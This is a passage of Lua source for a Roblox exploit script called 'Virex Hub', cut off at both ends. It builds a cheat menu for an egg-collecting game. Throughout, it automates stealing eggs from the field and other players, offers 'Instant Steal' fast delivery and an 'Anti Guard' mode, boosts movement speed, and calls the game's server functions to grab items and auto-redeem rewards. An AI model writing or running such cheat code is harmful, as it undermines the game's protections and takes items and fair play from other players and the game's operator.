task.delay(0.3, function()
pcall(tbl4.Lab.FixPickers)
end)
if flag and type(writefile) == "function" then
pcall(function()
if type(isfolder) == "function" and type(makefolder) == "function" and not isfolder("VirexHub") then
makefolder("VirexHub")
end
writefile(lab.ExtraPath, HttpService:JSONEncode(tbl31))
end)
end
end
tbl4.Lab.FixPickers = function()
local lab = tbl4.Lab
if not tbl4.Steal.RiftPriority or type(lab.LabelsFor) ~= "function" then
return
end
for k, picker in pairs(lab.Pickers) do
local handle = picker.Handle
local value = type(handle) == "table" and rawget(handle, "Instance") or nil
if typeof(value) == "Instance" and value.AbsoluteSize.Y <= 2 and type(handle.SetOptions) == "function" then
local v15, v16 = lab.LabelsFor(k)
if #v15 > 0 then
picker.CategoryOf = v16
pcall(handle.SetOptions, handle, v15, nil, false)
end
end
end
end
tbl4.Lab.PoolOf = function(arg)
local lab = tbl4.Lab
local v15 = lab.Pools[arg]
if v15 then
return v15
end
local tbl31 = {}
local tbl32 = {}
local v16 = ipairs
local tbl33 = lab.Shares[tostring(arg)] or {}
for _, v17 in v16(tbl33) do
local v18 = v17[1]
local v19 = v17[2]
if v19 >= 0.05 then
tbl31[v18] = true
end
table.insert(tbl32, { Category = v18, Share = v19 })
end
lab.Pools[arg] = tbl31
lab.PoolLists[arg] = tbl32
return tbl31
end
tbl4.Lab.IsLabPet = function(arg)
local lab = tbl4.Lab
if not lab.PetSet then
local petSet = {}
local data = lab.Data
if type(data) == "table" and type(data.Banners) == "table" then
for _, banner in ipairs(data.Banners) do
local v15 = ipairs
local pets = type(banner) == "table" and type(banner.Pets) == "table" and banner.Pets or {}
for _, pet in v15(pets) do
if type(pet) == "table" and pet.AssetId ~= nil then
petSet[tostring(pet.AssetId)] = true
end
end
end
end
if next(petSet) == nil then
return false
end
lab.PetSet = petSet
end
return lab.PetSet[tostring(arg)] == true
end
tbl4.Lab.StockActive = function()
return next(tbl4.Lab.Stock) ~= nil
end
tbl4.Lab.StockTargets = function()
local lab = tbl4.Lab
local tbl31 = {}
if not tbl4.Steal.RiftPriority or not lab.StockActive() then
return tbl31
end
for k in pairs(lab.Stock) do
local tbl32 = lab.StockEggs[k]
local v15 = pairs
tbl32 = type(tbl32) == "table" and tbl32 or {}
for k2 in v15(tbl32) do
tbl31[k2] = lab.StockPer
end
end
return tbl31
end
tbl4.Lab.Data = fn2(function()
return ReplicatedStorage.Data.ScrambleTradeIn
end)
tbl4.Lab.Fallback = {
{ Id = "Biohazard", Name = "Biohazard Pets" },
{ Id = "Experimental", Name = "Experimental Pets" },
{ Id = "UnstableDNA", Name = "Unstable DNA" },
}
tbl4.Lab.BannerList = function()
local data = tbl4.Lab.Data
local tbl31 = {}
if type(data) == "table" and type(data.Banners) == "table" then
for _, banner in ipairs(data.Banners) do
if type(banner) == "table" and banner.Id ~= nil then
table.insert(tbl31, { Id = tostring(banner.Id), Name = tostring(banner.DisplayName or banner.Id) })
end
end
end
if #tbl31 == 0 then
return tbl4.Lab.Fallback
end
return tbl31
end
tbl4.Lab.BannerName = function(arg)
for _, v15 in ipairs(tbl4.Lab.BannerList()) do
if v15.Id == tostring(arg) then
return v15.Name
end
end
return tostring(arg)
end
tbl4.Lab.BannerOk = function(arg)
if next(tbl4.Lab.Banners) == nil then
return true
end
return arg ~= nil and tbl4.Lab.Banners[tostring(arg)] == true
end
tbl4.Lab.PickedText = function()
local tbl31 = {}
for _, v15 in ipairs(tbl4.Lab.BannerList()) do
if tbl4.Lab.Banners[v15.Id] then
table.insert(tbl31, v15.Name)
end
end
return table.concat(tbl31, " or ")
end
local flag
flag = false
local tbl31
tbl31 = {}
local n6
n6 = 0
v4 = tbl5[4]
local n7
n7 = 27.4
local n8
n8 = 400
local fn13
fn13 = nil
v5 = v9:CreateToggle({
Name = "Auto Steal",
Default = false,
Callback = function()
if fn13 then
fn13()
end
end,
})
tbl4.SafeCarry.InstantHandle = v9:CreateToggle({
Name = "Instant Steal",
Note = "Delivers the egg to the safe zone in a few seconds, needs enough Speed",
Default = false,
Callback = function(arg)
if type(arg) ~= "boolean" then
arg = tbl4.Toggle(tbl4.SafeCarry.InstantHandle, false)
end
tbl4.SafeCarry.LineDrop = arg ~= false
tbl4.SafeCarry.SpeedJitter = tbl4.SafeCarry.LineDrop and 0 or 0.08
if tbl4.StealPanelSync then
pcall(tbl4.StealPanelSync)
end
end,
})
v9:CreateSlider({
Name = "Instant Steal Steps",
Note = "Higher is safer but takes longer",
Min = 1,
Max = 6,
Default = 3,
Increment = 1,
Callback = function(arg)
local n9 = math.clamp(math.floor(tonumber(arg) or 3), 1, 6)
local midDrops = {}
for i = 1, n9 - 1 do
table.insert(midDrops, i / n9)
end
tbl4.SafeCarry.MidDrops = midDrops
end,
})
for _, v15 in ipairs(tbl24) do
tbl26[v15] = true
end
fn6(v9:CreateMultiDropdown({
Name = "Target Areas",
Options = tbl24,
Default = tbl24,
Callback = function(arg)
local tbl32 = {}
if type(arg) == "table" then
for k, v15 in pairs(arg) do
if v15 == true and type(k) == "string" then
tbl32[k] = true
elseif type(v15) == "string" then
tbl32[v15] = true
end
end
end
if next(tbl32) == nil then
for _, v15 in ipairs(tbl24) do
tbl32[v15] = true
end
end
tbl26 = tbl32
end,
}))
v9:CreateMultiDropdown({
Name = "Target Rarities",
Note = "Steal only the rarities you pick (none = all)",
Options = (function()
local t = {}
for i = 2, #tbl13 do
t[#t + 1] = tbl13[i]
end
return t
end)(),
Default = {},
Callback = function(arg)
local set = {}
if type(arg) == "table" then
for k, x in pairs(arg) do
local name = (type(k) == "string" and x == true) and k or (type(x) == "string" and x or nil)
if name and tbl14[name] then
set[tbl14[name]] = true
end
end
end
tbl4.StealRarities = set
n5 = 0
end,
})
fn5(v9, {
Name = "Min Steal Value",
Note = "Skip eggs worth less than this. Drag or type 250k, 50m, 1.5b",
Legacy = "Min Value To Steal",
SectionName = "Auto Steal",
OnRaw = function(arg)
n6 = arg
end,
})
do
local tbl32 = {}
local tbl33 = {}
local directory = tbl.Assets and tbl.Assets.Directory
local tbl34 = {}
if type(directory) == "table" then
for k, v15 in pairs(directory) do
local rarity = type(v15) == "table" and v15.Rarity or nil
local flag2 = type(rarity) == "table"
if flag2 then
flag2 = tonumber(rarity.RarityNumber or rarity.Rank)
end
flag2 = flag2 or nil
if flag2 then
table.insert(tbl34, {
Category = tostring(k),
Name = tostring(v15.DisplayName or k),
Rarity = flag2,
RarityName = tostring(rarity.DisplayName or rarity._id or flag2),
})
end
end
end
table.sort(tbl34, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity > arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v15 in ipairs(tbl34) do
local str2 = string.format("%s [%s]", v15.Name, v15.RarityName)
if tbl33[str2] then
str2 = string.format("%s [%s] (%s)", v15.Name, v15.RarityName, v15.Category)
end
table.insert(tbl32, str2)
tbl33[str2] = v15.Category
end
fn6(v9:CreateMultiDropdown({
Name = "Target Specific Eggs",
Note = "Only steal these eggs (empty = all)",
Options = tbl32,
Default = {},
Callback = function(arg)
local tbl35 = {}
if type(arg) == "table" then
for k, v15 in pairs(arg) do
k = v15 == true and type(k) == "string" and k or type(v15) == "string" and v15 or nil
if k and tbl33[k] then
tbl35[tbl33[k]] = true
end
end
end
tbl27 = tbl35
end,
}))
end
do
local n9 = 30
local v15 = nil
local flag2 = false
local n10 = 0
local function fn14()
local tbl32 = {}
local save2 = tbl.Save
if type(save2) == "table" and type(save2.Get) == "function" then
local ok, result = pcall(save2.Get)
if ok and type(result) == "table" then
local tbl33 = {}
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function" then
local ok2, result2 = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if ok2 and type(result2) == "table" then
for k, v16 in pairs(result2) do
if type(v16) == "table" and v16.Placement ~= nil then
tbl33[k] = true
end
end
end
end
local v16 = pairs
local eggInventory = result.EggInventory or {}
for k, v17 in v16(eggInventory) do
if type(v17) == "table" and v17.AssetCategory ~= nil and not tbl33[k] then
local str2 = tostring(v17.AssetCategory)
tbl32[str2] = (tbl32[str2] or 0) + 1
end
end
end
end
return tbl32
end
local function fn15()
local lab = tbl4.Lab
local tbl32 = {}
tbl4.Steal.RiftCurrent = {}
local tbl33 = nil
if lab.StockActive() then
tbl33 = fn14()
for k, v16 in pairs(lab.StockTargets()) do
if (tbl33[k] or 0) < v16 then
tbl32[k] = true
end
end
local riftBanner = tbl4.Steal.RiftBanner
if riftBanner == nil or not lab.Stock[riftBanner] then
return tbl32
end
end
local tbl34 = {}
for _, riftRequirement in ipairs(tbl4.Steal.RiftRequirements) do
tbl34[riftRequirement] = (tbl34[riftRequirement] or 0) + 1
end
if next(tbl34) == nil then
return tbl32
end
if lab.SkipOwned then
tbl33 = tbl33 or fn14()
else
tbl33 = {}
end
local riftCurrent = {}
for k, v16 in pairs(tbl34) do
if (tbl33[k] or 0) < v16 then
tbl32[k] = true
riftCurrent[k] = true
end
end
tbl4.Steal.RiftCurrent = riftCurrent
return tbl32
end
local function fn16()
local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")
local isRemoteFunction = rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction")
local result = nil
local flag3 = false
if isRemoteFunction then
flag3, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)
end
if not flag3 or type(result) ~= "table" or type(result.Requirements) ~= "table" then
if tbl4.Lab.StockActive() then
tbl4.Steal.RiftNeeds = fn15()
end
return
end
tbl4.Steal.RiftBanner = result.BannerId ~= nil and tostring(result.BannerId) or nil
local riftRequirements = {}
if result.Unlocked ~= false and tbl4.Lab.BannerOk(result.BannerId) then
for _, requirement in ipairs(result.Requirements) do
table.insert(riftRequirements, tostring(requirement))
end
end
tbl4.Steal.RiftRequirements = riftRequirements
tbl4.Steal.RiftNeeds = fn15()
end
tbl3.Add(function()
if not tbl4.Steal.RiftPriority or flag2 or os.clock() < n10 then
return false
end
flag2 = true
n10 = os.clock() + n9
task.spawn(function()
pcall(fn16)
flag2 = false
end)
return false
end)
local function recount()
if not tbl4.Steal.RiftPriority then
return
end
local riftNeeds = tbl4.Steal.RiftNeeds
local v16 = fn15()
local flag3 = false
for k in pairs(riftNeeds) do
if not v16[k] then
flag3 = true
end
end
for k in pairs(v16) do
if not riftNeeds[k] then
flag3 = true
end
end
tbl4.Steal.RiftNeeds = v16
if flag3 then
tbl3.Wake()
end
end
tbl4.Lab.Recount = recount
local save2 = tbl.Save
if type(save2) == "table" and type(save2.FieldSignal) == "function" then
for _, v16 in ipairs({ "EggInventory", "Inventory" }) do
local ok, result = pcall(save2.FieldSignal, v16)
if ok and type(result) == "table" and type(result.Connect) == "function" then
local ok2, result2 = pcall(result.Connect, result, function()
task.defer(recount)
end)
if ok2 and result2 then
fn4(function()
pcall(function()
result2:Disconnect()
end)
end)
end
end
end
end
tbl4.Lab.ForceSteal = function()
n10 = 0
end
v15 = v9:CreateToggle({
Name = "Steal Missing Lab Eggs",
Default = false,
Callback = function()
tbl4.Steal.RiftPriority = tbl4.Toggle(v15, false) == true
n10 = 0
if not tbl4.Steal.RiftPriority then
tbl4.Steal.RiftNeeds = {}
end
task.delay(0.3, function()
pcall(tbl4.Lab.FixPickers)
end)
tbl3.Wake()
end,
})
v9:CreateToggle({
Name = "Skip Owned Lab Eggs",
Note = "Only for the current recipe",
Default = true,
ShowWhen = v15,
Callback = function(arg)
tbl4.Lab.SkipOwned = arg ~= false
pcall(recount)
end,
})
local tbl32 = {}
local tbl33 = {}
for _, v16 in ipairs(tbl4.Lab.BannerList()) do
table.insert(tbl32, v16.Name)
tbl33[v16.Name] = v16.Id
end
v9:CreateMultiDropdown({
Name = "Stock Lab Eggs For",
Note = "Collects eggs for these banners even before they open",
Options = tbl32,
Default = {},
ShowWhen = v15,
Callback = function(arg)
local stock = {}
if type(arg) == "table" then
for k, v16 in pairs(arg) do
k = v16 == true and type(k) == "string" and k
local flag3
if k then
flag3 = k
else
flag3 = type(v16) == "string" and v16
end
flag3 = flag3 or nil
if flag3 and tbl33[flag3] then
stock[tbl33[flag3]] = true
end
end
end
tbl4.Lab.Stock = stock
n10 = 0
task.spawn(function()
pcall(recount)
end)
tbl3.Wake()
end,
})
local ok, result = pcall(function()
local directory = tbl.Assets and tbl.Assets.Directory
local tbl34 = { Biohazard = "Biohazard", Experimental = "Experimental", UnstableDNA = "Unstable DNA" }
tbl4.Lab.LabelsFor = function(arg)
local tbl35 = {}
local tbl36 = {}
tbl4.Lab.PoolOf(arg)
local tbl37 = tbl4.Lab.PoolLists[arg] or {}
for _, v16 in ipairs(tbl37) do
local flag3 = type(directory) == "table" and directory[v16.Category] or nil
local n11 = v16.Share * 100
local str2 = n11 < 1 and "<1%" or string.format("%d%%", math.floor(n11 + 0.5))
local str3 = string.format("%s Egg (%s)", tostring(type(flag3) == "table" and flag3.DisplayName or v16.Category), str2)
if tbl36[str3] then
local format = string.format
local v17 = tostring
local displayName = type(flag3) == "table" and flag3.DisplayName or v16.Category
local category = v16.Category
str3 = format("%s Egg [%s] (%s)", v17(displayName), category, str2)
end
table.insert(tbl35, str3)
tbl36[str3] = v16.Category
end
return tbl35, tbl36
end
for _, v16 in ipairs(tbl4.Lab.BannerList()) do
local id = v16.Id
local v17, v18 = tbl4.Lab.LabelsFor(id)
local tbl35 = { CategoryOf = v18 }
tbl4.Lab.Pickers[id] = tbl35
local tbl36 = {}
for i = 1, math.min(5, #v17) do
table.insert(tbl36, v17[i])
end
tbl35.Handle = v9:CreateMultiDropdown({
Name = (tbl34[id] or v16.Name) .. " Lab Eggs",
Options = v17,
Default = tbl36,
ShowWhen = v15,
Callback = function(arg)
local tbl37 = {}
if type(arg) == "table" then
for k, v19 in pairs(arg) do
k = v19 == true and type(k) == "string" and k or type(v19) == "string" and v19
local v20 = k or nil
if v20 and tbl35.CategoryOf[v20] then
tbl37[tbl35.CategoryOf[v20]] = true
end
end
end
tbl4.Lab.StockEggs[id] = next(tbl37) ~= nil and tbl37 or nil
n10 = 0
task.spawn(function()
pcall(recount)
end)
tbl3.Wake()
end,
})
end
end)
if not ok then
warn("[Virex Hub] Lab egg pickers failed: " .. tostring(result))
end
task.spawn(function()
pcall(tbl4.Lab.RefreshPools)
end)
v9:CreateSlider({
Name = "Stock Per Egg",
Min = 1,
Max = 30,
Default = 3,
Increment = 1,
Unit = "",
ShowWhen = v15,
Callback = function(arg)
tbl4.Lab.StockPer = math.clamp(math.floor(tonumber(arg) or 3), 1, 30)
task.spawn(function()
pcall(recount)
end)
end,
})
end
do
local n9 = 5
local n10 = 5
local n11 = 60
local v15 = nil
local n12 = 0
local n13 = 0
local flag2 = false
local tbl32 = {}
local function fn14()
local save2 = tbl.Save
if type(save2) == "table" and type(save2.Get) == "function" then
local ok, result = pcall(save2.Get)
if ok and type(result) == "table" then
return result
end
end
return nil
end
local function fn15()
local v16 = fn14()
local directory = tbl.Areas and tbl.Areas.Directory
local directory2 = tbl.Assets and tbl.Assets.Directory
if not v16 or type(directory) ~= "table" or type(directory2) ~= "table" then
return
end
local index = type(v16.Index) == "table" and v16.Index or {}
local tbl33 = {}
local v17 = pairs
local inventory = v16.Inventory or {}
for _, v18 in v17(inventory) do
if type(v18) == "table" and v18.Category ~= nil then
tbl33[tostring(v18.Category)] = true
end
end
local v18 = pairs
local eggInventory = v16.EggInventory or {}
for _, v19 in v18(eggInventory) do
if type(v19) == "table" and v19.AssetCategory ~= nil then
tbl33[tostring(v19.AssetCategory)] = true
end
end
local tbl34 = {}
for _, v19 in pairs(directory) do
local flag3 = type(v19) == "table" and type(v19.Rarity) == "table"
if flag3 then
flag3 = tonumber(v19.Rarity.RarityNumber or v19.Rarity.Rank)
end
flag3 = flag3 or 0
local v20 = pairs
local dropTable = type(v19) == "table" and v19.DropTable or {}
for _, v21 in v20(dropTable) do
local flag4 = type(v21) == "table" and v21[1] or nil
local n14 = type(v21) == "table" and tonumber(v21[2]) or 0
local flag5 = flag4 ~= nil and directory2[flag4] or nil
if type(flag5) == "table" and n14 > 0 and flag5.DontRoll ~= true then
local str2 = tostring(flag4)
if index[flag4] ~= true and not tbl33[str2] and (tbl34[str2] == nil or flag3 > tbl34[str2]) then
tbl34[str2] = flag3
end
end
end
end
tbl31 = tbl34
end
local function fn16(arg, ...)
local v16 = networking:FindFirstChild(arg)
if not v16 or not v16:IsA("RemoteFunction") then
return false
end
local ok, result = pcall(v16.InvokeServer, v16, ...)
return ok and result ~= false
end
local function fn17(arg, arg2)
local tbl33 = {}
if type(arg) ~= "table" then
return tbl33
end
for _, v16 in ipairs(arg2) do
local flag3 = arg
for _, v17 in ipairs(v16) do
flag3 = type(flag3) == "table" and flag3[v17] or nil
end
local v17 = ipairs
flag3 = type(flag3) == "table" and flag3 or {}
for _, v18 in v17(flag3) do
if type(v18) == "table" and v18.AssetId ~= nil then
table.insert(tbl33, v18.AssetId)
end
end
end
return tbl33
end
local tbl33 = {
{
Id = "LimitedEgg",
Gear = "GravityDisruptor",
Module = "LimitedEgg",
Lists = { { "Entries" }, { "MechaReroll", "Entries" } },
},
{
Id = "BrainrotEgg",
Gear = "BeeLauncher",
Module = "BrainrotEgg",
Lists = { { "Entries" } },
},
{
Id = "MonsterEgg",
Gear = "BeeLauncher",
Module = "MonsterEgg",
Lists = { { "Entries" }, { "MechaEntries" } },
},
}
local function fn18()
local v16 = fn14()
if not v16 then
return
end
local index = type(v16.Index) == "table" and v16.Index or {}
local indexClaimedCategories = type(v16.IndexClaimedCategories) == "table" and v16.IndexClaimedCategories or {}
for k, v17 in pairs(index) do
if v17 == true and indexClaimedCategories[k] ~= true then
fn16("RF/Codex/AskRedeemAll")
break
end
end
local gearInventory = type(v16.GearInventory) == "table" and v16.GearInventory or {}
for _, v17 in ipairs(tbl33) do
local flag3 = (tonumber(gearInventory[v17.Gear]) or 0) <= 0
if flag3 then
flag3 = os.clock() >= (tbl32[v17.Id] or 0)
end
if flag3 then
local v18 = fn17(tbl[v17.Module], v17.Lists)
local flag4 = #v18 > 0
for _, v19 in ipairs(v18) do
if index[v19] ~= true then
flag4 = false
break
end
end
if flag4 then
tbl32[v17.Id] = os.clock() + n11
fn16("RF/Codex/AskRedeemLimitedEgg", v17.Id)
end
end
end
end
tbl3.Add(function()
local now = os.clock()
if flag and now >= n12 then
n12 = now + n9
pcall(fn15)
end
if not flag2 and now >= n13 and tbl4.Toggle(tbl4.IndexClaimHandle, false) then
flag2 = true
n13 = now + n10
task.spawn(function()
pcall(fn18)
flag2 = false
end)
end
return false
end)
v15 = v9:CreateToggle({
Name = "Steal Missing Index Eggs",
Note = "Also steal eggs missing from your index, highest area first",
Default = false,
Callback = function()
flag = tbl4.Toggle(v15, false) == true
n12 = 0
if not flag then
tbl31 = {}
end
tbl3.Wake()
end,
})
tbl4.IndexClaimRestart = function()
n13 = 0
tbl3.Wake()
end
end
tbl4.Steal.PriorityHandle = v9:CreateDropdown({
Name = "Steal Priority",
Options = tbl5,
Default = tbl5[4],
Callback = function(arg)
if table.find(tbl5, arg) then
v4 = arg
if type(tbl4.ResortSteal) == "function" then
tbl4.ResortSteal()
end
end
end,
})
tbl4.SafeCarry.RunHandle = v9:CreateSlider({
Name = "Tween Speed",
Note = "Over 100% may glitch",
Min = 50,
Max = 120,
Default = 100,
Increment = 1,
Unit = "%",
Callback = function(arg)
tbl4.SafeCarry.RunSpeed = math.clamp(tonumber(arg) or 100, 50, 120) / 100
end,
})
v9:CreateSlider({
Name = "Carry Speed",
Min = 80,
Max = 120,
Default = 100,
Increment = 1,
Unit = "%",
Callback = function(arg)
tbl4.SafeCarry.CarryScale = math.clamp(tonumber(arg) or 100, 80, 120) / 100
end,
})
tbl4.BossPortalUp = function()
return workspace:FindFirstChild("ScrambleArenaPortal") ~= nil
end
tbl4.AntiGuard.Handle = v2:CreateState({ Name = "Anti Guard Enabled", Default = false })
pcall(function()
tbl4.AntiGuard.Enabled = tbl4.AntiGuard.Handle:Get() == true
end)
pcall(function()
tbl4.AntiGuard.Handle:Subscribe(function(arg)
if type(arg) ~= "boolean" then
arg = tbl4.AntiGuard.Handle:Get()
end
tbl4.AntiGuard.Enabled = arg == true
if tbl4.StealPanelSync then
pcall(tbl4.StealPanelSync)
end
if tbl4.AntiGuard.Render and tbl4.UiDefer then
tbl4.UiDefer(function()
pcall(tbl4.AntiGuard.Render, false)
end)
end
end)
end)
-- Anti Guard Panel removed
tbl4.AntiGuard.PanelHandle = nil
tbl4.AntiGuard.PanelShown = false
local v15
v15 = nil
local v16
v16 = nil
local v17
v17 = nil
local str2
str2 = "None"
local str3
str3 = "Idle"
local flag2
flag2 = false
local n9
n9 = 0
local tbl32
tbl32 = {}
local n10
n10 = 20
local uid
uid = nil
local fn14
fn14 = function(arg)
return arg ~= n9 or not tbl4.Toggle(v15, false)
end
local fn15
do
local tbl33 = {}
local function fn16(arg)
if type(arg) ~= "number" or tbl33[arg] then
return
end
tbl33[arg] = true
task.delay(math.max(0, arg - workspace:GetServerTimeNow()) + 0.05, function()
tbl33[arg] = nil
tbl3.Wake()
end)
end
local n11 = 0
fn15 = function()
local areaEggCycle = tbl.AreaEggCycle
if type(areaEggCycle) ~= "table" then
return nil
end
local ok, result, result2, result3, result4 = pcall(function()
local serverTimeNow = workspace:GetServerTimeNow()
local nextResetTime = areaEggCycle.NextResetTime
return serverTimeNow, areaEggCycle.IsNightPhase(serverTimeNow), areaEggCycle.NextNightTime(serverTimeNow), nextResetTime(serverTimeNow)
end)
if not ok or type(result4) ~= "number" then
return nil
end
if result2 == true then
n11 = result4 + tbl4.WallOpenDelay()
fn16(n11)
return n11, "night", result
end
if tbl4.WallSealed() then
fn16(result + 0.3)
return math.max(n11, result), "wall", result
end
if type(result3) == "number" and result3 > result then
fn16(result3)
end
return nil
end
end
do
local areaEggResetWall = tbl.AreaEggResetWall
local changed = type(areaEggResetWall) == "table" and areaEggResetWall.Changed or nil
if changed and type(changed.Connect) == "function" then
local ok, result = pcall(function()
return changed:Connect(function()
tbl3.Wake()
end)
end)
if ok and result then
fn4(function()
pcall(function()
result:Disconnect()
end)
end)
end
end
end
local n11
n11 = 8
local v18
v18 = nil
local n12
n12 = 0
local fn16, fn17, fn18
local function fn19(arg)
local tbl33 = {}
local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
task.spawn(function()
local ok, result = pcall(eggState.ReadFieldEggs)
if ok and type(result) == "table" and type(result.Records) == "table" then
for _, record in pairs(result.Records) do
local flag3 = type(record) == "table" and type(record.Uid) == "string"
local flag4
if flag3 then
flag4 = not (arg and string.sub(record.Uid, 1, #str4) == str4)
else
flag4 = flag3
end
if flag4 then
tbl33[record.Uid] = true
end
end
end
end)
end
return tbl33
end
fn16 = function()
if v18 == nil then
return false
end
if tbl4.IsNight() then
return true
end
if n12 == math.huge then
n12 = os.clock() + n11
end
return false
end
fn17 = function()
if v18 and n12 == math.huge then
return
end
v18 = fn19(true)
n12 = math.huge
table.clear(tbl28)
table.clear(tbl30)
table.clear(tbl29)
table.clear(tbl32)
uid = nil
end
fn18 = function()
if not v18 then
return false
end
if n12 <= os.clock() then
v18 = nil
return false
end
local v19 = fn19()
if next(v19) == nil then
return true
end
local flag3 = false
local flag4 = false
for k in pairs(v19) do
if v18[k] then
flag3 = true
else
flag4 = true
end
end
if not flag3 then
v18 = nil
return false
end
return not flag4
end
local fn20
do
local function fn21(arg)
local directory = tbl.Assets and tbl.Assets.Directory
local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
local rarity = type(flag3) == "table" and type(flag3.Rarity) == "table" and flag3.Rarity or nil
local tbl33 = {}
if rarity then
rarity = tonumber(rarity.RarityNumber or rarity.Rank)
end
tbl33.RarityNumber = rarity or 0
tbl33.EarningRate = type(flag3) == "table" and tonumber(flag3.EarningRate) or 0
return tbl33
end
local function fn22(arg)
local mutations = tbl.Mutations
if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
local ok, result = pcall(mutations.EarningsFor, type(arg) == "table" and arg or {})
if ok and type(result) == "number" then
return result
end
end
return 1
end
local function fn23(arg, arg2)
local eggRecords = tbl.EggRecords
if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
if ok and type(result) == "number" then
return result
end
end
return 0
end
fn20 = function(arg, arg2)
local records = nil
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
task.spawn(function()
local ok, result = pcall(eggState.ReadFieldEggs)
if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
records = result.Records
end
end)
end
if not records then
local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
return {}
end
local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
records = ok and type(result) == "table" and result.Records or nil
end
if type(records) ~= "table" then
return {}
end
local tbl33 = {}
local tbl34 = {}
for _, record in pairs(records) do
local uid2 = type(record) == "table" and record.Uid or nil
if uid2 and record.State ~= "Claimed" then
tbl34[uid2] = true
end
local flag3 = record.State == "Carried" and arg2 == true and arg ~= true and not (tbl4.Steal.Carrying and uid2 == tbl4.Steal.CarryUid)
if uid2 then
flag3 = record.State == "Slot" or record.State == "Dropped" or flag3
else
flag3 = uid2
end
local v19 = uid2 and tbl28[uid2] or nil
local flag4 = uid2 and tbl29[uid2] == true or false
local flag5 = arg ~= true and flag and uid2 and tbl31[tostring(record.AssetCategory)] or nil
local flag6 = arg ~= true and tbl4.Steal.RiftPriority == true and uid2 ~= nil and tbl4.Steal.RiftNeeds[tostring(record.AssetCategory)] == true
local flag7 = arg == true or v19 ~= nil or flag4 or flag6 or flag5 ~= nil or tbl26[tostring(record.AreaId)] == true
local flag8 = arg ~= true and v19 == nil and tbl30[uid2] == true
local flag9 = v18 ~= nil and v18[uid2] == true
flag3 = flag3 and typeof(record.BottomCFrame) == "CFrame"
if flag3 then
flag3 = (tbl32[uid2] or 0) <= os.clock()
end
if flag3 and flag7 and not flag8 and not flag9 then
local v20 = fn21(record.AssetCategory)
local str4 = tostring(record.AssetCategory)
local stealRarities = tbl4.StealRarities
local flag10 = (stealRarities == nil or next(stealRarities) == nil) and v20.RarityNumber >= n5 or (stealRarities ~= nil and stealRarities[tonumber(v20.RarityNumber)] == true)
local flag11 = next(tbl27) == nil or tbl27[str4] == true
local n13 = tonumber(record.AssetScale) or 1
local v21 = fn22(record.Mutations)
local n14 = n13 > 5 and (n13 / 5) ^ 1.2 * 19.637875755794113 or n13 ^ 1.85
local flag12 = n6 <= 0 or v20.EarningRate * n14 * v21 >= n6
flag12 = flag10 and flag11 and flag12
local flag13 = flag6 and not flag12 and not flag4 and v19 == nil and flag5 == nil
local lastSkip = arg ~= true and tbl4.SafeCarry.Unsafe({ Uid = uid2, Category = str4 })
if lastSkip then
tbl28[uid2] = nil
tbl29[uid2] = nil
tbl4.SafeCarry.LastSkip = lastSkip
elseif arg == true or v19 or flag4 or flag6 or flag5 ~= nil or flag12 then
table.insert(tbl33, {
Uid = uid2,
Category = str4,
Scale = n13,
State = record.State,
Rarity = v20.RarityNumber,
Weight = fn23(record.AssetCategory, n13),
Mutation = v21,
Value = v20.EarningRate * n14 * v21,
CFrame = record.BottomCFrame,
AreaId = tostring(record.AreaId),
Rift = arg ~= true and flag6,
RiftOnly = arg ~= true and flag13,
RiftNow = arg ~= true and flag13 and tbl4.Steal.RiftCurrent[str4] == true,
Index = flag5,
Forced = arg ~= true and v19 and v19.At or nil,
Priority = arg ~= true and flag4,
})
end
end
end
if next(tbl34) ~= nil then
for k in pairs(tbl28) do
if not tbl34[k] then
tbl28[k] = nil
end
end
for k in pairs(tbl29) do
if not tbl34[k] then
tbl29[k] = nil
end
end
for k in pairs(tbl30) do
if not tbl34[k] then
tbl30[k] = nil
end
end
end
table.sort(tbl33, function(arg3, arg4)
if arg3.Forced ~= nil ~= arg4.Forced ~= nil then
return arg3.Forced ~= nil
end
if arg3.Forced and arg4.Forced and arg3.Forced ~= arg4.Forced then
return arg3.Forced < arg4.Forced
end
if arg3.Priority ~= arg4.Priority then
return arg3.Priority == true
end
if arg3.RiftOnly ~= arg4.RiftOnly then
return arg4.RiftOnly == true
end
if arg3.RiftOnly and arg3.RiftNow ~= arg4.RiftNow then
return arg3.RiftNow == true
end
if arg3.Index ~= nil ~= arg4.Index ~= nil then
return arg3.Index ~= nil
end
if arg3.Index and arg4.Index and arg3.Index ~= arg4.Index then
return arg3.Index > arg4.Index
end
if v4 == tbl5[2] and arg3.Weight ~= arg4.Weight then
return arg3.Weight > arg4.Weight
end
if v4 == tbl5[3] and arg3.Mutation ~= arg4.Mutation then
return arg3.Mutation > arg4.Mutation
end
if v4 == tbl5[4] and arg3.Value ~= arg4.Value then
return arg3.Value > arg4.Value
end
if v4 == tbl5[5] and arg3.Value ~= arg4.Value then
return arg3.Value < arg4.Value
end
if arg3.Rarity ~= arg4.Rarity then
return arg3.Rarity > arg4.Rarity
end
if arg3.Value ~= arg4.Value then
return arg3.Value > arg4.Value
end
return tostring(arg3.Uid) < tostring(arg4.Uid)
end)
return tbl33
end
end
local n13
n13 = 6
local fn21, fn22, fn23, fn24, fn25
do
local v19 = nil
local connection = nil
fn21 = function(arg, arg2, arg3, arg4, arg5)
local n14 = arg2 - arg.Position
local magnitude = n14.Magnitude
